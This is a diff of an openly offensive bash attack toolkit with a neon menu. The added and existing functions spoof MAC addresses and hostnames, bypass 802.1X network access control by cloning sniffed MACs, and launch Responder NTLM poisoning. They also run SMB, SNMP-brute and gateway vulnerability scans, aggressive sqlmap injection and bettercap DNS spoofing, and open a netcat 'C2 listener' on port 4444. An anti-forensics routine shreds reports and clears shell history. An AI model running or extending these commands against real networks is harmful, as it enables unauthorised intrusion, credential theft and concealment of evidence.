@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # --- SYSTEM PATH CONFIG ---
-export PATH=$PATH:$HOME/go/bin:/usr/local/bin:$(gem env home)/bin
+export PATH=$PATH:$HOME/go/bin:/usr/local/bin:$(gem env home)/bin:$HOME/.local/bin
 
 # --- CONFIGURATION SYSTEM ---
 CONFIG_FILE="$HOME/.lol_config"
@@ -13,6 +13,11 @@ DISCORD_WEBHOOK=""
 EOF
 fi
 source "$CONFIG_FILE"
+
+# --- NEON AESTHETIC ---
+NEON_BLUE='\e[1;34m'
+NEON_PINK='\e[1;35m'
+RESET='\e[0m'
 
 # --- CORE ENGINE ---
 
@@ -26,7 +31,7 @@ loading_anim() {
     local pid=$1
     local delay=0.1
     local spinstr='|/-\'
-    echo -ne " \e[1;33m[*] PROCESSING... \e[0m"
+    echo -ne " ${NEON_BLUE}[*] PROCESSING... ${RESET}"
     while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
         local temp=${spinstr#?}
         printf " [%c]  " "$spinstr"
@@ -34,67 +39,197 @@ loading_anim() {
         sleep $delay
         printf "\b\b\b\b\b\b"
     done
-    echo -e "\b\b\b\b\e[1;32m [DONE] \e[0m"
+    echo -e "\b\b\b\b${NEON_BLUE} [DONE] ${RESET}"
 }
 
 # --- PHANTOM TIER MODULES ---
 
+ghost_insertion() {
+    local INTERFACE=$(ip link | grep -E "eth|enp|eno" | awk '{print $2}' | tr -d ':' | head -n 1)
+    if [ -z "$INTERFACE" ]; then INTERFACE=$(ip link | grep "wlp" | awk '{print $2}' | tr -d ':' | head -n 1); fi
+    
+    echo -e "${NEON_PINK}[!] INITIATING FORCE-SILENCE GHOSTING: $INTERFACE${RESET}"
+    echo -e "${NEON_BLUE}[*] Killing system networking interference...${RESET}"
+    sudo nmcli device set "$INTERFACE" managed no 2>/dev/null
+    sudo dhclient -x "$INTERFACE" 2>/dev/null
+    
+    echo -e "${NEON_BLUE}[*] Randomizing hardware identity...${RESET}"
+    sudo ip link set dev "$INTERFACE" down
+    if ! sudo macchanger -r "$INTERFACE"; then
+        echo -e "${NEON_BLUE}[*] Standard macchanger failed. Using manual override...${RESET}"
+        sudo ip link set dev "$INTERFACE" address 00:$(openssl rand -hex 5 | sed 's/\(..\)/\1:/g; s/.$//')
+    fi
+    
+    echo -e "${NEON_BLUE}[*] Disabling IPv6 and flushing all addresses...${RESET}"
+    sudo sysctl -w net.ipv6.conf."$INTERFACE".disable_ipv6=1 > /dev/null
+    sudo ip addr flush dev "$INTERFACE"
+    sudo ip link set dev "$INTERFACE" promisc on
+    sudo ip link set dev "$INTERFACE" up
+    
+    echo -e "${NEON_BLUE}[+] GHOST MODE ACTIVE. Your machine is now a silent ghost.${RESET}"
+    echo -e "${NEON_BLUE}[*] System Network Manager has been locked out of $INTERFACE.${RESET}"
+}
+
+ghost_restore() {
+    local INTERFACE=$(ip link | grep -E "eth|enp|eno" | awk '{print $2}' | tr -d ':' | head -n 1)
+    if [ -z "$INTERFACE" ]; then INTERFACE=$(ip link | grep "wlp" | awk '{print $2}' | tr -d ':' | head -n 1); fi
+    
+    echo -e "${NEON_BLUE}[!] RESTORING STANDARD LINK: $INTERFACE${RESET}"
+    echo -e "${NEON_BLUE}[*] Re-enabling system networking management...${RESET}"
+    sudo ip link set dev "$INTERFACE" down
+    sudo ip link set dev "$INTERFACE" promisc off
+    sudo sysctl -w net.ipv6.conf."$INTERFACE".disable_ipv6=0 > /dev/null
+    sudo macchanger -p "$INTERFACE" || sudo ip link set dev "$INTERFACE" address $(ip link show "$INTERFACE" | grep "link/ether" | awk '{print $2}')
+    sudo nmcli device set "$INTERFACE" managed yes 2>/dev/null
+    sudo ip link set dev "$INTERFACE" up
+    sudo dhclient -nw "$INTERFACE"
+    echo -e "${NEON_BLUE}[+] LINK RESTORED.${RESET}"
+}
+
+direct_link_disco() {
+    echo -e "${NEON_PINK}[!] INITIATING DIRECT-LINK DISCOVERY (PASSIVE/ACTIVE)...${RESET}"
+    local INTERFACE=$(ip link | grep -E "eth|enp|eno" | awk '{print $2}' | tr -d ':' | head -n 1)
+    if [ -z "$INTERFACE" ]; then INTERFACE=$(ip link | grep "wlp" | awk '{print $2}' | tr -d ':' | head -n 1); fi
+    
+    echo -e "${NEON_BLUE}[*] Sniffing peer identities on $INTERFACE...${RESET}"
+    # Improved parsing to extract IP and MAC directly from DHCP/ARP/MDNS
+    sudo timeout 30 tcpdump -i "$INTERFACE" -lnne "(udp port 67 or arp or udp port 5353)" -c 10 2>/dev/null | awk '/ARP, Request/ {print "[+] ARP: " $NF " is at " $2} /MDNS/ {print "[+] mDNS Device Detected"} /bootp/ {print "[+] DHCP Request from: " $2}' | sort -u
+    
+    echo -ne "${NEON_BLUE}\n    Target IP to audit: ${RESET}"; read pip
+    if [ ! -z "$pip" ]; then share_hunter "$pip"; fi
+}
+
+share_hunter() {
+    echo -e "${NEON_PINK}[!] AGGRESSIVE SHARE & VULN HUNT: $1${RESET}"
+    echo -e "${NEON_BLUE}[*] Enumerating shares and checking for critical SMB vulnerabilities...${RESET}"
+    sudo nmap -p 139,445 --script smb-enum-shares,smb-enum-users,smb-vuln-ms17-010,smb-os-discovery -Pn "$1"
+    echo -e "\n${NEON_BLUE}[*] Checking NFS exports...${RESET}"
+    sudo nmap -p 2049 --script nfs-showmount,nfs-ls -Pn "$1"
+}
+
+wpad_audit() {
+    echo -e "${NEON_PINK}[!] WPAD / PROXY CONFIG AUDIT${RESET}"
+    echo -e "${NEON_BLUE}[*] Listening for proxy discovery requests (Web Proxy Auto-Discovery)...${RESET}"
+    sudo timeout 45 tcpdump -i any -ln "port 80 and host 255.255.255.255" -A 2>/dev/null | grep -i "GET /wpad.dat" && echo -e "${NEON_PINK}[!] ALERT: WPAD REQUEST DETECTED! Network is vulnerable to proxy poisoning.${RESET}" || echo "No WPAD traffic detected."
+}
+
+nac_bypass() {
+    echo -e "${NEON_PINK}[!] 802.1X NAC BYPASS (MAC CLONING)${RESET}"
+    local INTERFACE=$(ip link | grep -E "eth|enp|eno" | awk '{print $2}' | tr -d ':' | head -n 1)
+    echo -e "${NEON_BLUE}[*] Sniffing for CDP/LLDP/STP frames to map trusted infrastructure...${RESET}"
+    # Capture more frames to increase chance of finding trusted device MACs
+    sudo timeout 60 tcpdump -i "$INTERFACE" -nn -e -v -s 1500 '(ether[12:2]=0x88cc or ether[20:2]=0x2000 or ether proto 0x8808)' 2>/dev/null > /tmp/nac_sniff.txt
+    
+    local macs=$(grep -oE "([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}" /tmp/nac_sniff.txt | sort -u)
+    if [ -z "$macs" ]; then
+        echo -e "${NEON_PINK}[!] No trusted devices detected.${RESET}"
+    else
+        echo -e "${NEON_BLUE}[+] Potential Trusted MACs discovered:${RESET}"
+        echo "$macs" | nl
+        echo -ne "${NEON_BLUE}\n    Select MAC index to clone (or enter custom): ${RESET}"; read idx
+        local target_mac=$(echo "$macs" | sed -n "${idx}p")
+        if [ -z "$target_mac" ]; then target_mac=$idx; fi
+        
+        echo -e "${NEON_BLUE}[*] Spoofing MAC to $target_mac...${RESET}"
+        sudo ip link set dev "$INTERFACE" down
+        sudo macchanger -m "$target_mac" "$INTERFACE" > /dev/null || sudo ip link set dev "$INTERFACE" address "$target_mac"
+        sudo ip link set dev "$INTERFACE" up
+        echo -e "${NEON_BLUE}[+] Identity cloned. NAC bypass complete.${RESET}"
+    fi
+    rm /tmp/nac_sniff.txt
+}
+
+ntlm_poison() {
+    echo -e "${NEON_PINK}[!] NTLM POISONING & CAPTURE (RESPONDER)${RESET}"
+    local INTERFACE=$(ip link | grep -E "eth|enp|eno" | awk '{print $2}' | tr -d ':' | head -n 1)
+    if [ ! -d "/opt/Responder" ]; then echo -e "${NEON_PINK}[!] Responder not installed at /opt/Responder${RESET}"; return; fi
+    echo -e "${NEON_BLUE}[*] Launching Responder (Analysis & Capture) on $INTERFACE...${RESET}"
+    sudo python3 /opt/Responder/Responder.py -I "$INTERFACE" -wrf -v
+}
+
+gateway_hunt() {
+    echo -e "${NEON_PINK}[!] LOCAL GATEWAY ADMIN HUNT${RESET}"
+    local GW=$(ip route | grep default | awk '{print $3}' | head -n 1)
+    if [ -z "$GW" ]; then echo -e "${NEON_PINK}[!] No default gateway found.${RESET}"; return; fi
+    echo -e "${NEON_BLUE}[*] Gateway target: $GW${RESET}"
+    echo -e "${NEON_BLUE}[*] Auditing for management interfaces and common vulnerabilities...${RESET}"
+    sudo nmap -sV -p 21,22,23,80,443,445,8080,8443,10000 --script http-title,http-auth,ssl-cert,snmp-info,vuln -Pn "$GW"
+}
+
+protocol_audit() {
+    echo -e "${NEON_PINK}[!] AUDITING INTERNAL BROADCAST PROTOCOLS (LLMNR/mDNS)${RESET}"
+    echo -e "${NEON_BLUE}[*] Listening for leakages... (Run for 30s)${RESET}"
+    sudo timeout 30 tcpdump -i any -n "udp port 5353 or udp port 5355" -c 50 2>/dev/null
+}
+
+vlan_hop_recon() {
+    echo -e "${NEON_PINK}[!] INITIATING VLAN / TRUNKING RECON${RESET}"
+    echo -e "${NEON_BLUE}[*] Checking if current port is a Trunk (DTP/VTP)...${RESET}"
+    sudo yersinia dtp -t
+}
+
+snmp_map() {
+    echo -e "${NEON_PINK}[!] SNMP INFRASTRUCTURE MAPPING: $1${RESET}"
+    echo -e "${NEON_BLUE}[*] Brute-forcing community strings and dumping info...${RESET}"
+    sudo nmap -sU -p 161 --script snmp-brute,snmp-info,snmp-interfaces "$1"
+}
+
 origin_find() {
-    echo -e "\e[1;31m[!] INITIATING ORIGIN IP DISCOVERY: $1\e[0m"
-    echo -e "\e[1;33m[*] Searching CT Logs & Historical DNS...\e[0m"
+    echo -e "${NEON_PINK}[!] INITIATING ORIGIN IP DISCOVERY: $1${RESET}"
+    echo -e "${NEON_BLUE}[*] Searching CT Logs & Historical DNS...${RESET}"
     (req "https://crt.sh/?q=$1&output=json" | jq -r '.[].common_name' | sort -u) &
     (req "https://viewdns.info/iphistory/?domain=$1" | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | sort -u) &
     wait
 }
 
 employee_recon() {
-    echo -e "\e[1;31m[!] INITIATING EMPLOYEE RECON: $1\e[0m"
-    echo -e "\e[1;33m[*] Scraping professional fragments...\e[0m"
+    echo -e "${NEON_PINK}[!] INITIATING EMPLOYEE RECON: $1${RESET}"
+    echo -e "${NEON_BLUE}[*] Scraping professional fragments...${RESET}"
     req "https://www.google.com/search?q=site:linkedin.com/in/+\"%40$1\"" | grep -oE "[A-Z][a-z]+ [A-Z][a-z]+" | sort -u
 }
 
 supply_audit() {
-    echo -e "\e[1;31m[!] SUPPLY CHAIN VULNERABILITY AUDIT: $1\e[0m"
-    echo -e "\e[1;33m[*] Checking for exposed package metadata...\e[0m"
+    echo -e "${NEON_PINK}[!] SUPPLY CHAIN VULNERABILITY AUDIT: $1${RESET}"
+    echo -e "${NEON_BLUE}[*] Checking for exposed package metadata...${RESET}"
     for file in "package.json" "requirements.txt" "composer.json" "Gemfile"; do
-        req -L -I "https://$1/$file" | grep -q "200 OK" && echo -e " \e[1;31m[!] ALERT: $file EXPOSED at https://$1/$file\e[0m"
+        req -L -I "https://$1/$file" | grep -q "200 OK" && echo -e " ${NEON_PINK}[!] ALERT: $file EXPOSED at https://$1/$file${RESET}"
     done
 }
 
 # --- SHADOW TIER MODULES ---
 
 breach_search() {
-    echo -e "\e[1;31m[!] SEARCHING FOR LEAKED CREDENTIALS: $1\e[0m"
-    if [ -z "$HIBP_API_KEY" ]; then echo -e "\e[1;33m[*] HIBP_API_KEY not set in $CONFIG_FILE\e[0m"; return; fi
-    req "https://haveibeenpwned.com/api/v3/breachedaccount/$1" -H "hibp-api-key: $HIBP_API_KEY" || echo -e "\e[1;31m[*] No data or key invalid.\e[0m"
+    echo -e "${NEON_PINK}[!] SEARCHING FOR LEAKED CREDENTIALS: $1${RESET}"
+    if [ -z "$HIBP_API_KEY" ]; then echo -e "${NEON_BLUE}[*] HIBP_API_KEY not set in $CONFIG_FILE${RESET}"; return; fi
+    req "https://haveibeenpwned.com/api/v3/breachedaccount/$1" -H "hibp-api-key: $HIBP_API_KEY" || echo -e "${NEON_PINK}[*] No data or key invalid.${RESET}"
 }
 
 bt_recon() {
-    echo -e "\e[1;31m[!] PHYSICAL PROXIMITY RECON (BLUETOOTH)...\e[0m"
-    sudo hcitool scan || echo -e "\e[1;31m[!] No BT interface found.\e[0m"
+    echo -e "${NEON_PINK}[!] PHYSICAL PROXIMITY RECON (BLUETOOTH)...${RESET}"
+    sudo hcitool scan || echo -e "${NEON_PINK}[!] No BT interface found.${RESET}"
 }
 
 takeover_check() {
-    echo -e "\e[1;31m[!] SUBDOMAIN TAKEOVER AUDIT: $1\e[0m"
+    echo -e "${NEON_PINK}[!] SUBDOMAIN TAKEOVER AUDIT: $1${RESET}"
     nuclei -u "$1" -t takeovers/ -silent
 }
 
 ghost_mode() {
     INTERFACE=$(ip route get 8.8.8.8 | awk '{print $5; exit}')
     local NEW_HOST="GRIM-$(openssl rand -hex 3)"
-    echo -e "\e[1;31m[!] INITIATING GHOST MODE: $INTERFACE\e[0m"
+    echo -e "${NEON_PINK}[!] INITIATING GHOST MODE: $INTERFACE${RESET}"
     sudo ip link set dev $INTERFACE down
     sudo macchanger -r $INTERFACE
     sudo hostnamectl set-hostname "$NEW_HOST"
     sudo ip link set dev $INTERFACE up
-    echo -e "\e[1;32m[*] Identity spoofed. MAC randomized. Hostname: $NEW_HOST\e[0m"
+    echo -e "${NEON_BLUE}[*] Identity spoofed. MAC randomized. Hostname: $NEW_HOST${RESET}"
 }
 
 api_intel() {
-    echo -e "\e[1;31m[!] GLOBAL API INTEL (SHODAN): $1\e[0m"
-    if [ -z "$SHODAN_API_KEY" ]; then echo -e "\e[1;33m[*] SHODAN_API_KEY not set in $CONFIG_FILE\e[0m"; return; fi
+    echo -e "${NEON_PINK}[!] GLOBAL API INTEL (SHODAN): $1${RESET}"
+    if [ -z "$SHODAN_API_KEY" ]; then echo -e "${NEON_BLUE}[*] SHODAN_API_KEY not set in $CONFIG_FILE${RESET}"; return; fi
     shodan init "$SHODAN_API_KEY" > /dev/null 2>&1
-    shodan host "$1" 2>/dev/null || echo -e "\e[1;31m[!] No Shodan data found.\e[0m"
+    shodan host "$1" 2>/dev/null || echo -e "${NEON_PINK}[!] No Shodan data found.${RESET}"
 }
 
 discord_notify() {
@@ -105,13 +240,13 @@ discord_notify() {
 # --- CORE ATTACK & RECON MODULES ---
 
 rust_scan() {
-    echo -e "\e[1;31m[!] ULTRA-FAST PORT SCAN (RUSTSCAN): $1\e[0m"
+    echo -e "${NEON_PINK}[!] ULTRA-FAST PORT SCAN (RUSTSCAN): $1${RESET}"
     ulimit -n 65535 2>/dev/null
     rustscan -a "$1" --ulimit 5000 -- -sV -sC -O -Pn -T4
 }
 
 sub_discover() {
-    echo -e "\e[1;31m[!] AGGRESSIVE MULTI-SOURCE SUBDOMAIN MAP: $1\e[0m"
+    echo -e "${NEON_PINK}[!] AGGRESSIVE MULTI-SOURCE SUBDOMAIN MAP: $1${RESET}"
     local tmp_sub="/tmp/lol_subs"
     subfinder -d "$1" -all -silent > "$tmp_sub"
     assetfinder --subs-only "$1" >> "$tmp_sub"
@@ -120,66 +255,67 @@ sub_discover() {
 }
 
 sql_inject() {
-    echo -e "\e[1;31m[!] AGGRESSIVE SQL INJECTION: $1\e[0m"
+    echo -e "${NEON_PINK}[!] AGGRESSIVE SQL INJECTION: $1${RESET}"
     sqlmap -u "$1" --batch --random-agent --level=3 --risk=2 --tamper=space2comment --dbs --exclude-sysdbs
 }
 
 vuln_scan() {
-    echo -e "\e[1;31m[!] DEEP VULNERABILITY AUDIT (HTTPX + NUCLEI): $1\e[0m"
-    echo -e "\e[1;33m[*] Profiling technologies and filtering alive hosts...\e[0m"
+    echo -e "${NEON_PINK}[!] DEEP VULNERABILITY AUDIT (HTTPX + NUCLEI): $1${RESET}"
+    echo -e "${NEON_BLUE}[*] Profiling technologies and filtering alive hosts...${RESET}"
     echo "$1" | httpx -silent | nuclei -severity low,medium,high,critical -t cves,vulnerabilities,exposed-panels,misconfiguration,takeovers -rl 50 -c 50 -es info
 }
 
 cloud_recon() {
-    echo -e "\e[1;31m[!] CLOUD ASSET ENUMERATION: $1\e[0m"
+    echo -e "${NEON_PINK}[!] CLOUD ASSET ENUMERATION: $1${RESET}"
     local providers=("s3.amazonaws.com" "blob.core.windows.net" "storage.googleapis.com")
     for p in "${providers[@]}"; do
         local url="https://$1.$p"
-        req -L -I "$url" | grep -q "200\|403" && echo -e " \e[1;32m[+]\e[0m Found Asset: $url"
+        req -L -I "$url" | grep -q "200\|403" && echo -e " ${NEON_BLUE}[+]${RESET} Found Asset: $url"
     done
 }
 
 web_fuzz() {
-    echo -e "\e[1;31m[!] AGGRESSIVE WEB FUZZING (FFUF): $1\e[0m"
+    echo -e "${NEON_PINK}[!] AGGRESSIVE WEB FUZZING (FFUF): $1${RESET}"
     ffuf -u "$1/FUZZ" -w /usr/share/wordlists/dirb/big.txt -mc 200,301,302,403 -e .php,.html,.txt,.git,.env,.bak,.zip -t 100 -recursion -recursion-depth 2 -v
 }
 
 wp_audit() {
-    echo -e "\e[1;31m[!] WORDPRESS SECURITY AUDIT: $1\e[0m"
+    echo -e "${NEON_PINK}[!] WORDPRESS SECURITY AUDIT: $1${RESET}"
     wpscan --url "$1" --enumerate vp,vt,tt,u,cb,dbe --plugins-detection aggressive --force --no-update --disable-tls-checks
 }
 
 # --- WORLD-CLASS OPERATIONAL MODULES ---
 
 github_dork() {
-    echo -e "\e[1;31m[!] INITIATING GITHUB DORKING: $1\e[0m"
+    echo -e "${NEON_PINK}[!] INITIATING GITHUB DORKING: $1${RESET}"
     local queries=("filename:config" "filename:.env" "extension:sql" "password" "aws_key")
     for q in "${queries[@]}"; do
-        echo -e " \e[1;32m[+]\e[0m Querying: $q"
+        echo -e " ${NEON_BLUE}[+]${RESET} Querying: $q"
         req "https://github.com/search?q=org%3A$1+$q&type=code" | grep -oE "/[a-zA-Z0-9_-]+/[a-zA-Z0-9._-]+" | sort -u | head -n 5
     done
 }
 
 internal_enum() {
-    echo -e "\e[1;31m[!] INTERNAL NETWORK ENUM (SMB/RPC): $1\e[0m"
+    echo -e "${NEON_PINK}[!] INTERNAL NETWORK ENUM (SMB/RPC): $1${RESET}"
     sudo nmap -p 139,445 --script smb-enum-shares,smb-enum-users -Pn "$1"
 }
 
 anti_forensics() {
-    echo -e "\e[1;31m[!] INITIATING GHOST WIPE\e[0m"
-    find . -name "lol_report_*" -o -name "lol_intel_*" | xargs shred -u 2>/dev/null
+    echo -e "${NEON_PINK}[!] INITIATING GHOST WIPE${RESET}"
+    local SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
+    find "$SCRIPT_DIR" -name "lol_report_*" -o -name "lol_intel_*" | xargs shred -u 2>/dev/null
     history -c && history -w
-    echo -e "\e[1;32m[+] Operation complete. No trace remains.\e[0m"
+    echo -e "${NEON_BLUE}[+] Operation complete. No trace remains.${RESET}"
 }
 
 c2_listener() {
-    echo -e "\e[1;31m[!] INITIATING C2 LISTENER ON PORT 4444...\e[0m"
+    echo -e "${NEON_PINK}[!] INITIATING C2 LISTENER ON PORT 4444...${RESET}"
     nc -lvp 4444
 }
 
 dns_hijack() {
-    echo -ne "\e[1;37m    Domain to spoof: \e[0m"; read dom
-    echo -ne "\e[1;37m    Redirect to IP: \e[0m"; read rip
+    echo -ne "${NEON_BLUE}    Domain to spoof: ${RESET}"; read dom
+    echo -ne "${NEON_BLUE}    Redirect to IP: ${RESET}"; read rip
     sudo bettercap -eval "set dns.spoof.domains $dom; set dns.spoof.address $rip; dns.spoof on; net.sniff on"
 }
 
@@ -187,7 +323,7 @@ dns_hijack() {
 
 show_banner() {
     clear
-    echo -e "\e[1;37m"
+    echo -e "${NEON_BLUE}"
     echo -e "                ...........        ..:.                               "
     echo -e "               :::::::::::::::.  ::..:::. .:....                      "
     echo -e "               .::...          .:::..::::  ............               "
@@ -222,7 +358,7 @@ show_banner() {
     echo -e "                        L   O   L"
     echo -e "                P O T E N C Y   E D I T I O N"
     echo -e " ____________________________________________________________________ "
-    echo -e "\e[0m"
+    echo -e "${RESET}"
 }
 
 grim_gui() {
@@ -233,86 +369,151 @@ grim_gui() {
     while true; do
         DISPLAY_IP=$LOCAL_IP
         if [ "$BLUR_IP" = true ]; then DISPLAY_IP="[ HIDDEN ]"; fi
-        
-        STEALTH_STATUS="\e[1;31mDISABLED\e[0m"
-        if [ "$USE_TOR" = true ]; then STEALTH_STATUS="\e[1;32mACTIVE (TOR)\e[0m"; fi
-        
+        STEALTH_STATUS="${NEON_PINK}DISABLED${RESET}"; if [ "$USE_TOR" = true ]; then STEALTH_STATUS="${NEON_BLUE}ACTIVE (TOR)${RESET}"; fi
         HOST_NOW=$(hostname)
         
         show_banner
-        echo -e " \e[1;37m┌─────────────────────── SYSTEM STATUS ────────────────────────┐\e[0m"
-        echo -e " \e[1;37m│\e[0m  \e[1;32mIP:\e[0m $DISPLAY_IP  \e[1;32mSTEALTH:\e[0m $STEALTH_STATUS  \e[1;32mID:\e[0m $HOST_NOW \e[1;37m│\e[0m"
-        echo -e " \e[1;37m└──────────────────────────────────────────────────────────────┘\e[0m"
+        echo -e " ${NEON_BLUE}┌─────────────────────── SYSTEM STATUS ────────────────────────┐${RESET}"
+        echo -e " ${NEON_BLUE}│${RESET}  ${NEON_BLUE}IP:${RESET} $DISPLAY_IP  ${NEON_BLUE}STEALTH:${RESET} $STEALTH_STATUS  ${NEON_BLUE}ID:${RESET} $HOST_NOW ${NEON_BLUE}│${RESET}"
+        echo -e " ${NEON_BLUE}└──────────────────────────────────────────────────────────────┘${RESET}"
         echo -e ""
-        echo -e " \e[1;37m┌─ WEB & INTEL ───────┐ ┌─ DEEP SEARCH ────────┐ ┌─ CYBER WARFARE ──────┐\e[0m"
-        echo -e " \e[1;37m│\e[0m [1] AUTO-PILOT      \e[1;37m│ │\e[0m [A] EMAIL (HOLEHE)  \e[1;37m│ │\e[0m [F] MULTI-FLOOD      \e[1;37m│\e[0m"
-        echo -e " \e[1;37m│\e[0m [2] REMOTE INTEL    \e[1;37m│ │\e[0m [B] PHONE (INFOGA)  \e[1;37m│ │\e[0m [G] AGGRESSIVE ARP   \e[1;37m│\e[0m"
-        echo -e " \e[1;37m│\e[0m [3] JS ANALYSIS     \e[1;37m│ │\e[0m [C] USER (SHERLOCK) \e[1;37m│ │\e[0m [H] KILL CONNECTION  \e[1;37m│\e[0m"
-        echo -e " \e[1;37m│\e[0m [4] DNS HISTORY     \e[1;37m│ │\e[0m [D] METADATA (EXIF) \e[1;37m│ │\e[0m [I] WI-FI DEAUTH     \e[1;37m│\e[0m"
-        echo -e " \e[1;37m│\e[0m [5] CMS DETECT      \e[1;37m│ │\e[0m [E] DARK WEB SEARCH \e[1;37m│ │\e[0m [J] VULN SCAN (NUC)  \e[1;37m│\e[0m"
-        echo -e " \e[1;37m│\e[0m [6] CLOUD RECON     \e[1;37m│ │\e[0m [K] EXPLOIT SEARCH  \e[1;37m│ │\e[0m [L] WEB FUZZ (FFUF)  \e[1;37m│\e[0m"
-        echo -e " \e[1;37m│\e[0m [7] SUBDOMAIN MAP   \e[1;37m│ │\e[0m [N] SQL INJECT TEST \e[1;37m│ │\e[0m [O] TOR STEALTH TOG \e[1;37m│\e[0m"
-        echo -e " \e[1;37m│\e[0m [8] RUST PORT SCAN  \e[1;37m│ │\e[0m [Y] MALWARE (YARA)  \e[1;37m│ │\e[0m [Z] DEPLOY HONEYPOT \e[1;37m│\e[0m"
-        echo -e " \e[1;37m│\e[0m [9] SHODAN INTEL    \e[1;37m│ │\e[0m [0] GHOST MODE TOG  \e[1;37m│ │\e[0m [!] DEAD DROP NOTIF \e[1;37m│\e[0m"
-        echo -e " \e[1;37m│\e[0m [T] TAKEOVER AUDIT  \e[1;37m│ │\e[0m [P] BREACH SEARCH   \e[1;37m│ │\e[0m [~] PROXIMITY SCAN  \e[1;37m│\e[0m"
-        echo -e " \e[1;37m│\e[0m [V] BRUTE FORCE     \e[1;37m│ │\e[0m [R] HASH CRACKER    \e[1;37m│ │\e[0m [Q] PAYLOAD GEN     \e[1;37m│\e[0m"
-        echo -e " \e[1;37m│\e[0m [@] GHOST WIPE      \e[1;37m│ │\e[0m [#] C2 LISTENER     \e[1;37m│ │\e[0m [$] DNS HIJACK      \e[1;37m│\e[0m"
-        echo -e " \e[1;37m│\e[0m [=] ORIGIN DISCOVERY \e[1;37m│ │\e[0m [&] EMPLOYEE RECON  \e[1;37m│ │\e[0m [^] SUPPLY AUDIT    \e[1;37m│\e[0m"
-        echo -e " \e[1;37m│\e[0m [,] GITHUB DORKS    \e[1;37m│ │\e[0m [.] API SECRETS     \e[1;37m│ │\e[0m [/] INTERNAL ENUM   \e[1;37m│\e[0m"
-        echo -e " \e[1;37m└─────────────────────┘ └──────────────────────┘ └──────────────────────┘\e[0m"
-        echo -e " \e[1;37m[W] WP AUDIT  [S] SNIFFER  [M] MAC CHANGER  [U] BLUR IP  [X] EXIT\e[0m"
+        echo -e " ${NEON_BLUE}    [1] WEB & INFRASTRUCTURE INTEL${RESET}"
+        echo -e " ${NEON_BLUE}    [2] DEEP SEARCH & OSINT HUB${RESET}"
+        echo -e " ${NEON_BLUE}    [3] CYBER WARFARE OPERATIONS${RESET}"
+        echo -e " ${NEON_BLUE}    [4] ETHERNET & INTERNAL OPS${RESET}"
         echo -e ""
-        echo -ne " \e[1;37m[#] SELECT MODE > \e[0m"
+        echo -e " ${NEON_BLUE} [O] STEALTH  [U] BLUR IP  [M] GHOST MODE  [X] EXIT${RESET}"
+        echo -e ""
+        echo -ne " ${NEON_BLUE} [#] SELECT CATEGORY > ${RESET}"
         read choice
         
         case $choice in
-            1) echo -ne "    Target: "; read t; bash "$0" auto "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
-            2) echo -ne "    Target: "; read t; bash "$0" remote "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
-            3) echo -ne "    Target: "; read t; bash "$0" js "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
-            4) echo -ne "    Target: "; read t; bash "$0" history "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
-            5) echo -ne "    Target: "; read t; bash "$0" cms "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
-            6) echo -ne "    Keyword: "; read t; bash "$0" cloud "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
-            7) echo -ne "    Domain: "; read t; bash "$0" subfinder "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
-            8) echo -ne "    Target IP: "; read t; bash "$0" rustscan "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
-            9) echo -ne "    Target IP: "; read t; bash "$0" shodan "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
-            0) ghost_mode ;;
-            A|a) echo -ne "    Email: "; read t; bash "$0" email "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
-            B|b) bt_recon; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
-            C|c) echo -ne "    Username: "; read t; bash "$0" user "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
-            D|d) echo -ne "    File/URL: "; read t; bash "$0" file "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
-            E|e) echo -ne "    Keyword: "; read t; bash "$0" dark "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
-            F|f) echo -ne "    Target IP: "; read t; bash "$0" flood "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
-            G|g) bash "$0" arp; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
-            H|h) echo -ne "    Target IP: "; read t; bash "$0" kill "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
-            I|i) echo -ne "    AP BSSID: "; read t; bash "$0" deauth "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
-            J|j) echo -ne "    Target: "; read t; bash "$0" nuclei "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
-            K|k) echo -ne "    Software/Ver: "; read t; bash "$0" exploit "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
-            L|l) echo -ne "    Target URL: "; read t; bash "$0" fuzz "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
-            N|n) echo -ne "    URL with ID: "; read t; bash "$0" sqlmap "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
+            1) gui_web_intel ;;
+            2) gui_deep_search ;;
+            3) gui_warfare ;;
+            4) gui_ethernet ;;
             O|o) toggle_tor ;;
-            P|p) echo -ne "    Email/User: "; read t; bash "$0" breach "$t"; echo -e "\n\e[1;33m[!] Task Complete. Press Enter to return to menu...\e[0m"; read ;;
